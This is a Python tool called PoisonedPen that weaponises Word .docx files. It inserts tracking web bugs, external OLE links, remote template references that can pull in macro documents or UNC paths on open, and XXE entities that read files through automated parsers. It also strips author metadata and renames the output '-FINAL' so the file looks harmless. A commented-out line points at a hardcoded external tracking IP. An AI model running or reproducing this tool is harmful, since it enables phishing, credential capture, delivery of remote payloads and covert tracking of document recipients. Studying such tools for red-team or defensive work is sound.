#!/usr/bin/env python

import re, argparse, os, sys, tempfile, shutil, binascii, olefile
from docx import Document
from lxml import etree
from zipfile import ZipFile

# Class to describe all poisedpen operations
class PoisonedPen:

  vbastr = ''
  contents = {}

  def __init__( self, docxpath ):
    if not os.path.isfile( docxpath ):
      print('No file at ' + docxpath)
      return False
    self.filename = docxpath

  def get_dom( self, path='word/document.xml' ):
    x = self.get_xml(path)
    if type( x ) is str: x = x.encode('utf8')
    d = etree.ElementTree( etree.fromstring( x ) )
    return d

  # Get the raw XML markup in word/document.xml
  def get_xml( self, path='word/document.xml' ):
    if path in list(self.contents.keys()):
      return self.contents[path]
    z = ZipFile( self.filename )
    return z.read(path).decode('utf8')

  # Save doc
  def save( self ):
    if len(self.contents) == 0:
      print('No changes - save not required')
      return False
    print('Writing out to '+self.filename)
    self.update_zip( self.contents )

  # Replace the contents of the zip with the dictionary of path:contents
  def update_zip( self, contents={} ):
    
    tmpfd, tmpname = tempfile.mkstemp(dir=os.path.dirname(self.filename))
    os.close(tmpfd)

    with ZipFile( self.filename, 'r' ) as zin:
      with ZipFile( tmpname, 'w' ) as zout:
        zout.comment = zin.comment
        for item in zin.infolist():
          if item.filename not in list(contents.keys()):
            zout.writestr( item, zin.read(item.filename))
          else:
            zout.writestr( item, contents[item.filename] )

    os.remove( self.filename )
    if os.path.isfile( self.filename ):
      print('Didn\'t delete file')
    os.rename( tmpname, self.filename )

  # Add an entry to document.xml.rels and return the rId number
  def add_rel( self, rtype, target, targetmode=None ):
    # <Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="http://..." TargetMode="External"/>
    rels = self.get_dom( 'word/_rels/document.xml.rels' )

    # Discover the highest rId number
    rid = 0
    for r in rels.findall('//'):
      i = int(r.attrib['Id'].replace('rId',''))
      # print(i)
      if i > rid:
        rid = i
    rid += 2
    rid = 'rId' + str( rid )
    # print('Creating element with rId ' + rid)
    
    # Create rel
    attribs = {
      'Id': rid,
      'Type': rtype,
      'Target': target,
    }
    if targetmode:
      attribs['TargetMode'] = 'External'
    rel = etree.Element('Relationship', attribs )
    rels.getroot().append(rel)
    xmlstr = etree.tostring(rels,encoding='utf8',method='xml')
    # xmlstr = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/><Relationship Id="'+rid+'" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="http://193.36.15.194/tracker.gif?id=1" TargetMode="External"/></Relationships>'
    # print(xmlstr.decode('utf8'))
    self.contents['word/_rels/document.xml.rels'] = xmlstr
    return rid
    
  
  # Insert a 1x1px image using the given URL at the end of the document
  def insert_webbug( self, url ):

    # Insert entry into word/_rels/document.xml.rels and /Relationships
    rid = self.add_rel( 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/image', url, 'External' ) 

    # Create rsid, store in settings
    settings = self.get_xml( 'word/settings.xml' )
    ok = False
    while not ok:
      rsid = binascii.b2a_hex(os.urandom(4)).decode('utf8').upper()
      if rsid not in settings:
        ok = True
    # rsid = '00CB6E19'
    # print('Random hex: ' + rsid)
    # rsid = '<w:rsid w:val="00ED3C60"/>'
    el = '<w:rsid w:val="'+rsid+'"/>'
    settings = settings.replace( '</w:rsids>', el + '</w:rsids>' )
    self.contents['word/settings.xml'] = settings
    # contents['word/settings.xml'] = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<w:settings xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml" xmlns:sl="http://schemas.openxmlformats.org/schemaLibrary/2006/main" mc:Ignorable="w14 w15"><w:zoom w:percent="120"/><w:proofState w:spelling="clean" w:grammar="clean"/><w:defaultTabStop w:val="720"/><w:characterSpacingControl w:val="doNotCompress"/><w:compat><w:compatSetting w:name="compatibilityMode" w:uri="http://schemas.microsoft.com/office/word" w:val="15"/><w:compatSetting w:name="overrideTableStyleFontSizeAndJustification" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="enableOpenTypeFeatures" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="doNotFlipMirrorIndents" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="differentiateMultirowTableHeaders" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/></w:compat><w:rsids><w:rsidRoot w:val="000F7C79"/><w:rsid w:val="000F7C79"/><w:rsid w:val="00181E59"/><w:rsid w:val="00197E8A"/><w:rsid w:val="0023724B"/><w:rsid w:val="00292746"/><w:rsid w:val="00AA6863"/><w:rsid w:val="00C83833"/><w:rsid w:val="'+rsid+'"/><w:rsid w:val="00ED3C60"/><w:rsid w:val="00F83091"/><w:rsid w:val="00FC2467"/></w:rsids><m:mathPr><m:mathFont m:val="Cambria Math"/><m:brkBin m:val="before"/><m:brkBinSub m:val="--"/><m:smallFrac m:val="0"/><m:dispDef/><m:lMargin m:val="0"/><m:rMargin m:val="0"/><m:defJc m:val="centerGroup"/><m:wrapIndent m:val="1440"/><m:intLim m:val="subSup"/><m:naryLim m:val="undOvr"/></m:mathPr><w:themeFontLang w:val="en-GB"/><w:clrSchemeMapping w:bg1="light1" w:t1="dark1" w:bg2="light2" w:t2="dark2" w:accent1="accent1" w:accent2="accent2" w:accent3="accent3" w:accent4="accent4" w:accent5="accent5" w:accent6="accent6" w:hyperlink="hyperlink" w:followedHyperlink="followedHyperlink"/><w:shapeDefaults><o:shapedefaults v:ext="edit" spidmax="1026"/><o:shapelayout v:ext="edit"><o:idmap v:ext="edit" data="1"/></o:shapelayout></w:shapeDefaults><w:decimalSymbol w:val="."/><w:listSeparator w:val=","/><w15:chartTrackingRefBased/><w15:docId w15:val="{C80FAF87-6FBB-4006-9231-945AFB0B53C8}"/></w:settings>'

    doc = self.get_xml( 'word/document.xml' )
    # Get an id for the new shape

    # Construct XML describing paragraph with an image in it, referencing the rId above
    p = '<w:p w:rsidR="'+rsid+'" w:rsidRDefault="'+rsid+'"><w:r><w:pict><v:shapetype id="_x0000_t75" coordsize="21600,21600" o:spt="75" o:preferrelative="t" path="m@4@5l@4@11@9@11@9@5xe" filled="f" stroked="f"><v:stroke joinstyle="miter"/><v:formulas><v:f eqn="if lineDrawn pixelLineWidth 0"/><v:f eqn="sum @0 1 0"/><v:f eqn="sum 0 0 @1"/><v:f eqn="prod @2 1 2"/><v:f eqn="prod @3 21600 pixelWidth"/><v:f eqn="prod @3 21600 pixelHeight"/><v:f eqn="sum @0 0 1"/><v:f eqn="prod @6 1 2"/><v:f eqn="prod @7 21600 pixelWidth"/><v:f eqn="sum @8 21600 0"/><v:f eqn="prod @7 21600 pixelHeight"/><v:f eqn="sum @10 21600 0"/></v:formulas><v:path o:extrusionok="f" gradientshapeok="t" o:connecttype="rect"/><o:lock v:ext="edit" aspectratio="t"/></v:shapetype><v:shape id="_x0000_i1025" type="#_x0000_t75" style="width:3.75pt;height:5pt"><v:imagedata r:id="'+rid+'"/></v:shape></w:pict></w:r></w:p>'
    doc = doc.replace("</w:body>", p + "</w:body>" )
    self.contents['word/document.xml'] = doc

    # self.contents.update( contents )
    print('Inserted web bug, rsid: ' + rsid + ', rid: ' + rid + ', URL: ' + url )
    return True

  # Insert any file as an OLE object
  def insert_ole( self, url ):
    rid = self.add_rel( 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject', url, 'External' )
    doc = self.get_xml( 'word/document.xml' )

    # Construct a shape which imports the ole object
    p = '<w:p w14:paraId="720AA3DA" w14:textId="6089DC1A" w:rsidR="00642844" w:rsidRDefault="007E0FA4"><w:pPr><w:spacing w:beforeAutospacing="1" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/><w:rPr><w:sz w:val="30"/><w:szCs w:val="30"/></w:rPr></w:pPr><w:r><w:rPr><w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/><w:b/><w:sz w:val="30"/><w:szCs w:val="30"/><w:u w:val="single"/><w:lang w:eastAsia="en-GB"/></w:rPr><w:t></w:t></w:r><w:bookmarkStart w:id="0" w:name="_GoBack"/><w:r><w:rPr><w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/><w:b/><w:sz w:val="30"/><w:szCs w:val="30"/><w:u w:val="single"/><w:lang w:eastAsia="en-GB"/></w:rPr><w:object w:dxaOrig="4320" w:dyaOrig="4320" w14:anchorId="0457A93C"><v:shapetype id="_x0000_t75" coordsize="21600,21600" o:spt="75" o:preferrelative="t" path="m@4@5l@4@11@9@11@9@5xe" filled="f" stroked="f"><v:stroke joinstyle="miter"/><v:formulas><v:f eqn="if lineDrawn pixelLineWidth 0"/><v:f eqn="sum @0 1 0"/><v:f eqn="sum 0 0 @1"/><v:f eqn="prod @2 1 2"/><v:f eqn="prod @3 21600 pixelWidth"/><v:f eqn="prod @3 21600 pixelHeight"/><v:f eqn="sum @0 0 1"/><v:f eqn="prod @6 1 2"/><v:f eqn="prod @7 21600 pixelWidth"/><v:f eqn="sum @8 21600 0"/><v:f eqn="prod @7 21600 pixelHeight"/><v:f eqn="sum @10 21600 0"/></v:formulas><v:path o:extrusionok="f" gradientshapeok="t" o:connecttype="rect"/><o:lock v:ext="edit" aspectratio="t"/></v:shapetype><v:shape id="_x0000_i1025" type="#_x0000_t75" style="width:3.75pt;height:3.75pt" o:ole=""><v:imagedata r:id="rId5" o:title="" cropbottom="64444f" cropright="64444f"/></v:shape><o:OLEObject Type="Link" ProgID="htmlfile" ShapeID="_x0000_i1025" DrawAspect="Content" r:id="'+rid+'" UpdateMode="OnCall"><o:LinkType>EnhancedMetaFile</o:LinkType><o:LockedField>false</o:LockedField><o:FieldCodes>\f 0</o:FieldCodes></o:OLEObject></w:object></w:r><w:bookmarkEnd w:id="0"/></w:p>'
    doc = doc.replace("</w:body>", p + "</w:body>" )
    self.contents['word/document.xml'] = doc
    print('Inserted external OLE reference, rid: '+rid+', URL: '+url)

  # Insert external template reference
  def insert_template( self, url ):
    rid = self.add_rel( 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate', url, 'External' )
    print('Inserted external template reference, rid: '+rid+', URL: '+url)

  # Strip author info out
  def sanitise( self ):
    print('Stripping creator and lastModifiedBy metadata...')
    elements = ['dc:creator','cp:lastModifiedBy']
    props = 'docProps/core.xml'
    xml = self.get_xml( props )
    for el in elements:
      xml = re.sub( '<'+el+'>[^<]+</'+el+'>', '<'+el+'></'+el+'>', xml )
    self.contents.update( {props: xml} )

  # Insert XXE into document xml
  def insert_xxe( self, path ):
    doc = 'word/document.xml'
    print('Inserting XXE SYSTEM element pointing to ' + path + ' into '+doc+'. This will almost certainly prevent it from opening in any MS Office editing software...')
    xml = self.get_xml( doc )
    xml = re.sub( '(<\?xml[^>]+>)', r'\1<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "'+path+'" >]><foo>&xxe;</foo>', xml.decode('utf-8') )
    self.contents.update( { doc: xml } )
  

def main():
  
  newsuffix = '-FINAL'
  
  # Command line options
  parser = argparse.ArgumentParser(description="Easily poison Word documents with fun stuff")
  parser.add_argument("-r", "--replace", action="store_true", help="Replace a file in place instead of creating a new one and appending '"+newsuffix+".docx' to the file name" )
  parser.add_argument("-s", "--suffix", help="Suffix to use instead of '"+newsuffix+"' (extension is always preserved)" )
  parser.add_argument("--sanitise", action="store_true", help="Strip identifiable information (author, last modified by, company) from document" )
  parser.add_argument("-w", "--webbug", metavar="URL", action="append", help="Insert a web bug to this URL (can be http(s)/UNC, can insert multiple into one doc)" )
  # TODO
  # parser.add_argument("--docm", metavar="MACROTXT", help="Generate a .docm file containing this macro" )
  parser.add_argument("--ole", help="Insert an external oleObject reference to this URL / path" )
  parser.add_argument("-t", "--template", help="Insert the URL of a template to download as the document opens (e.g. UNC path, macro doc)" )
  parser.add_argument("-x", "--xxe", help="Insert XXE SYSTEM element into the document which fetches this path/URL and displays it inline. WARNING - will break Word parsing - use only against automated parsers" )
  parser.add_argument("documents", nargs="+", help="The word file(s) to poison (supports wildcards)")
  if len( sys.argv)==1:
    parser.print_help()
    sys.exit(1)
  args = parser.parse_args()

  if args.suffix: newsuffix = args.suffix

  for docfile in args.documents:
    if not args.replace:
      name, ext = os.path.splitext(docfile)
      newfile = name + newsuffix + ext
      print('Creating new file: ' + newfile)
      shutil.copy( docfile, newfile )
      docfile = newfile
    
    doc = PoisonedPen( docfile )

    if args.webbug:
      for bug in args.webbug:
        doc.insert_webbug( bug )
    
    if args.template:
      doc.insert_template( args.template )

    if args.ole:
      doc.insert_ole( args.ole )

    if args.sanitise:
      doc.sanitise()
  
    if args.xxe:
      doc.insert_xxe(args.xxe)

    doc.save()

if __name__ == "__main__":
  main()

